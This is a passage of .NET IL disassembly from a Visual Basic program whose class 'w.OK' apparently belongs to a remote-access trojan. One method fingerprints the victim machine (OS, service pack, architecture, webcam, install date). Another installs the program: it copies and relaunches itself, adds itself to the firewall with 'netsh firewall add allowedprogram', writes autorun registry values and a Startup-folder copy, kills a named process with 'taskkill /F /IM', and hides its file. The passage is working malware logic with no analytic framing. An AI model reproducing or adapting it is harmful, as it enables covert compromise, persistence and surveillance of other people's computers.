      IL_0126:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_012b:  stloc.s    exception10
      IL_012d:  nop
      IL_012e:  ldloc.1
      IL_012f:  ldstr      "\?\?"
      IL_0134:  ldsfld     string w.OK::Y
      IL_0139:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_013e:  stloc.1
      IL_013f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0144:  leave.s    IL_0146

    }  // end handler
    IL_0146:  nop
    IL_0147:  nop
    .try
    {
      IL_0148:  ldloc.1
      IL_0149:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
      IL_014e:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_0153:  stloc.s    VB$t_date$S0
      IL_0155:  ldloca.s   VB$t_date$S0
      IL_0157:  call       instance valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Date()
      IL_015c:  stloc.s    VB$t_date$S1
      IL_015e:  ldloca.s   VB$t_date$S1
      IL_0160:  ldstr      "yy-MM-dd"
      IL_0165:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_016a:  ldsfld     string w.OK::Y
      IL_016f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0174:  stloc.1
      IL_0175:  leave.s    IL_0198

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0177:  dup
      IL_0178:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_017d:  stloc.s    exception11
      IL_017f:  nop
      IL_0180:  ldloc.1
      IL_0181:  ldstr      "\?\?-\?\?-\?\?"
      IL_0186:  ldsfld     string w.OK::Y
      IL_018b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0190:  stloc.1
      IL_0191:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0196:  leave.s    IL_0198

    }  // end handler
    IL_0198:  nop
    IL_0199:  ldloc.1
    IL_019a:  ldstr      ""
    IL_019f:  ldsfld     string w.OK::Y
    IL_01a4:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_01a9:  stloc.1
    IL_01aa:  nop
    .try
    {
      IL_01ab:  ldloc.1
      IL_01ac:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
      IL_01b1:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_01b6:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_01bb:  ldstr      "Microsoft"
      IL_01c0:  ldstr      ""
      IL_01c5:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01ca:  ldstr      "Windows"
      IL_01cf:  ldstr      "Win"
      IL_01d4:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01d9:  ldstr      bytearray (AE 00 ) 
      IL_01de:  ldstr      ""
      IL_01e3:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01e8:  ldstr      bytearray (22 21 )                                           // "!
      IL_01ed:  ldstr      ""
      IL_01f2:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01f7:  ldstr      "  "
      IL_01fc:  ldstr      " "
      IL_0201:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0206:  ldstr      " Win"
      IL_020b:  ldstr      "Win"
      IL_0210:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0215:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_021a:  stloc.1
      IL_021b:  leave.s    IL_0239

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_021d:  dup
      IL_021e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0223:  stloc.s    exception12
      IL_0225:  nop
      IL_0226:  ldloc.1
      IL_0227:  ldstr      "\?\?"
      IL_022c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0231:  stloc.1
      IL_0232:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0237:  leave.s    IL_0239

    }  // end handler
    IL_0239:  nop
    IL_023a:  ldloc.1
    IL_023b:  ldstr      "SP"
    IL_0240:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0245:  stloc.1
    IL_0246:  nop
    .try
    {
      IL_0247:  call       class [mscorlib]System.OperatingSystem [mscorlib]System.Environment::get_OSVersion()
      IL_024c:  callvirt   instance string [mscorlib]System.OperatingSystem::get_ServicePack()
      IL_0251:  ldstr      " "
      IL_0256:  ldc.i4.m1
      IL_0257:  ldc.i4.0
      IL_0258:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_025d:  stloc.s    strArray
      IL_025f:  ldloc.s    strArray
      IL_0261:  ldlen
      IL_0262:  conv.ovf.i4
      IL_0263:  ldc.i4.1
      IL_0264:  ceq
      IL_0266:  stloc.s    VB$CG$t_bool$S0
      IL_0268:  ldloc.s    VB$CG$t_bool$S0
      IL_026a:  brfalse.s  IL_0278

      IL_026c:  ldloc.1
      IL_026d:  ldstr      "0"
      IL_0272:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0277:  stloc.1
      IL_0278:  nop
      IL_0279:  ldloc.1
      IL_027a:  ldloc.s    strArray
      IL_027c:  ldloc.s    strArray
      IL_027e:  ldlen
      IL_027f:  conv.ovf.i4
      IL_0280:  ldc.i4.1
      IL_0281:  sub.ovf
      IL_0282:  ldelem.ref
      IL_0283:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0288:  stloc.1
      IL_0289:  leave.s    IL_02a7

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_028b:  dup
      IL_028c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0291:  stloc.s    exception13
      IL_0293:  nop
      IL_0294:  ldloc.1
      IL_0295:  ldstr      "0"
      IL_029a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_029f:  stloc.1
      IL_02a0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02a5:  leave.s    IL_02a7

    }  // end handler
    IL_02a7:  nop
    IL_02a8:  nop
    .try
    {
      IL_02a9:  ldc.i4.s   38
      IL_02ab:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02b0:  ldstr      "x86"
      IL_02b5:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_02ba:  stloc.s    VB$CG$t_bool$S0
      IL_02bc:  ldloc.s    VB$CG$t_bool$S0
      IL_02be:  brfalse.s  IL_02d3

      IL_02c0:  ldloc.1
      IL_02c1:  ldstr      " x64"
      IL_02c6:  ldsfld     string w.OK::Y
      IL_02cb:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02d0:  stloc.1
      IL_02d1:  br.s       IL_02e5

      IL_02d3:  nop
      IL_02d4:  ldloc.1
      IL_02d5:  ldstr      " x86"
      IL_02da:  ldsfld     string w.OK::Y
      IL_02df:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02e4:  stloc.1
      IL_02e5:  nop
      IL_02e6:  leave.s    IL_0304

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02e8:  dup
      IL_02e9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02ee:  stloc.s    exception14
      IL_02f0:  nop
      IL_02f1:  ldloc.1
      IL_02f2:  ldsfld     string w.OK::Y
      IL_02f7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02fc:  stloc.1
      IL_02fd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0302:  leave.s    IL_0304

    }  // end handler
    IL_0304:  nop
    IL_0305:  call       bool w.OK::Cam()
    IL_030a:  stloc.s    VB$CG$t_bool$S0
    IL_030c:  ldloc.s    VB$CG$t_bool$S0
    IL_030e:  brfalse.s  IL_0323

    IL_0310:  ldloc.1
    IL_0311:  ldstr      "Yes"
    IL_0316:  ldsfld     string w.OK::Y
    IL_031b:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0320:  stloc.1
    IL_0321:  br.s       IL_0335

    IL_0323:  nop
    IL_0324:  ldloc.1
    IL_0325:  ldstr      "No"
    IL_032a:  ldsfld     string w.OK::Y
    IL_032f:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0334:  stloc.1
    IL_0335:  nop
    IL_0336:  ldc.i4.7
    IL_0337:  newarr     [mscorlib]System.String
    IL_033c:  stloc.s    VB$t_array$S0
    IL_033e:  ldloc.s    VB$t_array$S0
    IL_0340:  ldc.i4.0
    IL_0341:  ldloc.1
    IL_0342:  stelem.ref
    IL_0343:  nop
    IL_0344:  ldloc.s    VB$t_array$S0
    IL_0346:  ldc.i4.1
    IL_0347:  ldsfld     string w.OK::VR
    IL_034c:  stelem.ref
    IL_034d:  nop
    IL_034e:  ldloc.s    VB$t_array$S0
    IL_0350:  ldc.i4.2
    IL_0351:  ldsfld     string w.OK::Y
    IL_0356:  stelem.ref
    IL_0357:  nop
    IL_0358:  ldloc.s    VB$t_array$S0
    IL_035a:  ldc.i4.3
    IL_035b:  ldstr      ".."
    IL_0360:  stelem.ref
    IL_0361:  nop
    IL_0362:  ldloc.s    VB$t_array$S0
    IL_0364:  ldc.i4.4
    IL_0365:  ldsfld     string w.OK::Y
    IL_036a:  stelem.ref
    IL_036b:  nop
    IL_036c:  ldloc.s    VB$t_array$S0
    IL_036e:  ldc.i4.5
    IL_036f:  call       string w.OK::ACT()
    IL_0374:  stelem.ref
    IL_0375:  nop
    IL_0376:  ldloc.s    VB$t_array$S0
    IL_0378:  ldc.i4.6
    IL_0379:  ldsfld     string w.OK::Y
    IL_037e:  stelem.ref
    IL_037f:  nop
    IL_0380:  ldloc.s    VB$t_array$S0
    IL_0382:  call       string [mscorlib]System.String::Concat(string[])
    IL_0387:  stloc.1
    IL_0388:  ldstr      ""
    IL_038d:  stloc.2
    IL_038e:  nop
    .try
    {
      IL_038f:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
      IL_0394:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0399:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_039e:  ldstr      "Software\\"
      IL_03a3:  ldsfld     string w.OK::RG
      IL_03a8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_03ad:  ldc.i4.0
      IL_03ae:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string,
                                                                                                                                    valuetype [mscorlib]Microsoft.Win32.RegistryKeyPermissionCheck)
      IL_03b3:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_03b8:  stloc.s    VB$t_array$L1
      IL_03ba:  ldc.i4.0
      IL_03bb:  stloc.s    VB$t_i4$L0
      IL_03bd:  br.s       IL_03ed

      IL_03bf:  ldloc.s    VB$t_array$L1
      IL_03c1:  ldloc.s    VB$t_i4$L0
      IL_03c3:  ldelem.ref
      IL_03c4:  stloc.s    str4
      IL_03c6:  ldloc.s    str4
      IL_03c8:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_03cd:  ldc.i4.s   32
      IL_03cf:  ceq
      IL_03d1:  stloc.s    VB$CG$t_bool$S0
      IL_03d3:  ldloc.s    VB$CG$t_bool$S0
      IL_03d5:  brfalse.s  IL_03e5

      IL_03d7:  ldloc.2
      IL_03d8:  ldloc.s    str4
      IL_03da:  ldstr      ","
      IL_03df:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_03e4:  stloc.2
      IL_03e5:  nop
      IL_03e6:  ldloc.s    VB$t_i4$L0
      IL_03e8:  ldc.i4.1
      IL_03e9:  add.ovf
      IL_03ea:  stloc.s    VB$t_i4$L0
      IL_03ec:  nop
      IL_03ed:  ldloc.s    VB$t_i4$L0
      IL_03ef:  ldloc.s    VB$t_array$L1
      IL_03f1:  ldlen
      IL_03f2:  conv.ovf.i4
      IL_03f3:  clt
      IL_03f5:  stloc.s    VB$CG$t_bool$S0
      IL_03f7:  ldloc.s    VB$CG$t_bool$S0
      IL_03f9:  brtrue.s   IL_03bf

      IL_03fb:  leave.s    IL_040d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03fd:  dup
      IL_03fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0403:  stloc.s    exception15
      IL_0405:  nop
      IL_0406:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_040b:  leave.s    IL_040d

    }  // end handler
    IL_040d:  nop
    IL_040e:  ldloc.1
    IL_040f:  ldloc.2
    IL_0410:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0415:  stloc.0
    IL_0416:  br.s       IL_0418

    IL_0418:  ldloc.0
    IL_0419:  ret
  } // end of method OK::inf

  .method public static void  INS() cil managed noinlining
  {
    // Code size       1042 (0x412)
    .maxstack  5
    .locals init ([0] class [mscorlib]System.Exception V_0,
             [1] class [mscorlib]System.Exception ex,
             [2] class [mscorlib]System.Exception V_2,
             [3] class [mscorlib]System.Exception V_3,
             [4] class [mscorlib]System.Exception V_4,
             [5] class [mscorlib]System.Exception V_5,
             [6] string a,
             [7] string[] b,
             [8] string f,
             [9] string g,
             [10] valuetype [mscorlib]System.IO.FileAttributes h,
             [11] class [mscorlib]System.Exception V_11,
             [12] class [mscorlib]System.IO.StreamWriter c,
             [13] class [mscorlib]System.Exception V_13,
             [14] string[] VB$t_array$S0,
             [15] int32 VB$t_i4$L0,
             [16] string[] VB$t_array$L1,
             [17] bool VB$CG$t_bool$S0)
    IL_0000:  nop
    IL_0001:  ldc.i4     0x3e8
    IL_0006:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_000b:  nop
    IL_000c:  ldsfld     bool w.OK::Idr
    IL_0011:  brfalse.s  IL_0047

    IL_0013:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
    IL_0018:  ldsfld     string w.OK::DR
    IL_001d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0022:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0027:  ldstr      "\\"
    IL_002c:  ldsfld     string w.OK::EXE
    IL_0031:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0036:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_003b:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0040:  call       bool w.OK::CompDir(class [mscorlib]System.IO.FileInfo,
                                            class [mscorlib]System.IO.FileInfo)
    IL_0045:  brfalse.s  IL_004a

    IL_0047:  ldc.i4.0
    IL_0048:  br.s       IL_004b

    IL_004a:  ldc.i4.1
    IL_004b:  stloc.s    VB$CG$t_bool$S0
    IL_004d:  ldloc.s    VB$CG$t_bool$S0
    IL_004f:  brfalse    IL_010b

    IL_0054:  nop
    .try
    {
      IL_0055:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_005a:  ldc.i4.2
      IL_005b:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                        valuetype [mscorlib]System.IO.FileAttributes)
      IL_0060:  nop
      IL_0061:  ldsfld     string w.OK::DR
      IL_0066:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_006b:  ldstr      "\\"
      IL_0070:  ldsfld     string w.OK::EXE
      IL_0075:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_007a:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_007f:  stloc.s    VB$CG$t_bool$S0
      IL_0081:  ldloc.s    VB$CG$t_bool$S0
      IL_0083:  brfalse.s  IL_00a4

      IL_0085:  ldsfld     string w.OK::DR
      IL_008a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_008f:  ldstr      "\\"
      IL_0094:  ldsfld     string w.OK::EXE
      IL_0099:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_009e:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_00a3:  nop
      IL_00a4:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
      IL_00a9:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00ae:  ldsfld     string w.OK::DR
      IL_00b3:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00b8:  ldstr      "\\"
      IL_00bd:  ldsfld     string w.OK::EXE
      IL_00c2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00c7:  ldc.i4.1
      IL_00c8:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_00cd:  nop
      IL_00ce:  ldsfld     string w.OK::DR
      IL_00d3:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00d8:  ldstr      "\\"
      IL_00dd:  ldsfld     string w.OK::EXE
      IL_00e2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00e7:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_00ec:  pop
      IL_00ed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_00f2:  nop
      IL_00f3:  leave.s    IL_010a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00f5:  dup
      IL_00f6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00fb:  stloc.0
      IL_00fc:  nop
      IL_00fd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0102:  nop
      IL_0103:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0108:  leave.s    IL_010a

    }  // end handler
    IL_010a:  nop
    IL_010b:  nop
    IL_010c:  nop
    .try
    {
      IL_010d:  ldc.i4.5
      IL_010e:  newarr     [mscorlib]System.String
      IL_0113:  stloc.s    VB$t_array$S0
      IL_0115:  ldloc.s    VB$t_array$S0
      IL_0117:  ldc.i4.0
      IL_0118:  ldstr      "netsh firewall add allowedprogram \""
      IL_011d:  stelem.ref
      IL_011e:  nop
      IL_011f:  ldloc.s    VB$t_array$S0
      IL_0121:  ldc.i4.1
      IL_0122:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
      IL_0127:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_012c:  stelem.ref
      IL_012d:  nop
      IL_012e:  ldloc.s    VB$t_array$S0
      IL_0130:  ldc.i4.2
      IL_0131:  ldstr      "\" \""
      IL_0136:  stelem.ref
      IL_0137:  nop
      IL_0138:  ldloc.s    VB$t_array$S0
      IL_013a:  ldc.i4.3
      IL_013b:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
      IL_0140:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
      IL_0145:  stelem.ref
      IL_0146:  nop
      IL_0147:  ldloc.s    VB$t_array$S0
      IL_0149:  ldc.i4.4
      IL_014a:  ldstr      "\" ENABLE"
      IL_014f:  stelem.ref
      IL_0150:  nop
      IL_0151:  ldloc.s    VB$t_array$S0
      IL_0153:  call       string [mscorlib]System.String::Concat(string[])
      IL_0158:  ldc.i4.0
      IL_0159:  ldc.i4.0
      IL_015a:  ldc.i4.m1
      IL_015b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0160:  pop
      IL_0161:  leave.s    IL_0172

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0163:  dup
      IL_0164:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0169:  stloc.1
      IL_016a:  nop
      IL_016b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0170:  leave.s    IL_0172

    }  // end handler
    IL_0172:  nop
    IL_0173:  ldsfld     bool w.OK::Isu
    IL_0178:  stloc.s    VB$CG$t_bool$S0
    IL_017a:  ldloc.s    VB$CG$t_bool$S0
    IL_017c:  brfalse    IL_0223

    IL_0181:  nop
    .try
    {
      IL_0182:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
      IL_0187:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_018c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0191:  ldsfld     string w.OK::sf
      IL_0196:  ldc.i4.1
      IL_0197:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_019c:  ldsfld     string w.OK::RG
      IL_01a1:  ldstr      "\""
      IL_01a6:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
      IL_01ab:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01b0:  ldstr      "\" .."
      IL_01b5:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01ba:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_01bf:  nop
      IL_01c0:  leave.s    IL_01d1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01c2:  dup
      IL_01c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01c8:  stloc.2
      IL_01c9:  nop
      IL_01ca:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01cf:  leave.s    IL_01d1

    }  // end handler
    IL_01d1:  nop
    IL_01d2:  nop
    .try
    {
      IL_01d3:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
      IL_01d8:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_01dd:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_01e2:  ldsfld     string w.OK::sf
      IL_01e7:  ldc.i4.1
      IL_01e8:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_01ed:  ldsfld     string w.OK::RG
      IL_01f2:  ldstr      "\""
      IL_01f7:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
      IL_01fc:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0201:  ldstr      "\" .."
      IL_0206:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_020b:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0210:  nop
      IL_0211:  leave.s    IL_0222

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0213:  dup
      IL_0214:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0219:  stloc.3
      IL_021a:  nop
      IL_021b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0220:  leave.s    IL_0222

    }  // end handler
    IL_0222:  nop
    IL_0223:  nop
    IL_0224:  ldsfld     bool w.OK::IsF
    IL_0229:  stloc.s    VB$CG$t_bool$S0
    IL_022b:  ldloc.s    VB$CG$t_bool$S0
    IL_022d:  brfalse.s  IL_029f

    IL_022f:  nop
    .try
    {
      IL_0230:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0235:  ldc.i4.2
      IL_0236:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                        valuetype [mscorlib]System.IO.FileAttributes)
      IL_023b:  nop
      IL_023c:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
      IL_0241:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0246:  ldc.i4.7
      IL_0247:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_024c:  ldstr      "\\"
      IL_0251:  ldsfld     string w.OK::RG
      IL_0256:  ldstr      ".exe"
      IL_025b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0260:  ldc.i4.1
      IL_0261:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_0266:  nop
      IL_0267:  ldc.i4.7
      IL_0268:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_026d:  ldstr      "\\"
      IL_0272:  ldsfld     string w.OK::RG
      IL_0277:  ldstr      ".exe"
      IL_027c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0281:  ldc.i4.3
      IL_0282:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_0287:  stsfld     class [mscorlib]System.IO.FileStream w.OK::FS
      IL_028c:  leave.s    IL_029e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_028e:  dup
      IL_028f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0294:  stloc.s    V_4
      IL_0296:  nop
      IL_0297:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_029c:  leave.s    IL_029e

    }  // end handler
    IL_029e:  nop
    IL_029f:  nop
    IL_02a0:  ldsfld     bool w.OK::anti2
    IL_02a5:  stloc.s    VB$CG$t_bool$S0
    IL_02a7:  ldloc.s    VB$CG$t_bool$S0
    IL_02a9:  brfalse.s  IL_02c3

    IL_02ab:  ldstr      "taskkill /F /IM "
    IL_02b0:  ldsfld     string w.OK::anti
    IL_02b5:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_02ba:  ldc.i4.0
    IL_02bb:  ldc.i4.0
    IL_02bc:  ldc.i4.m1
    IL_02bd:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                               bool,
                                                                                               int32)
    IL_02c2:  pop
    IL_02c3:  nop
    IL_02c4:  ldsfld     bool w.OK::HD
    IL_02c9:  stloc.s    VB$CG$t_bool$S0
    IL_02cb:  ldloc.s    VB$CG$t_bool$S0
    IL_02cd:  brfalse.s  IL_02ef

    IL_02cf:  nop
    .try
    {
      IL_02d0:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_02d5:  ldc.i4.2
      IL_02d6:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                        valuetype [mscorlib]System.IO.FileAttributes)
      IL_02db:  nop
      IL_02dc:  leave.s    IL_02ee

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02de:  dup
      IL_02df:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02e4:  stloc.s    V_5
      IL_02e6:  nop
